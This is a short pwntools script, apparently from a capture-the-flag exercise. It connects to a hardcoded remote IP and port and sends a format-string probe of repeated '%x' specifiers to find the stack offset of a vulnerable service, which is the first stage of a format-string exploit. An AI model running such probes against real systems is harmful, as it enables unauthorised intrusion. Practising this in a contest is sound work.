from pwn import *

context.log_level = 'debug'

conn = remote('39.96.193.120', 10000)

# Receive initial message
response = conn.recvuntil(b'everything.', timeout=5)
log.info(f"Received: {response}")

# Send format string to find offset
# Use sendline to add newline
payload = b'AAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x'
conn.sendline(payload)

# Wait for all responses
import time
time.sleep(2)
response2 = conn.recv(timeout=5)
log.info(f"Response: {response2}")

conn.close()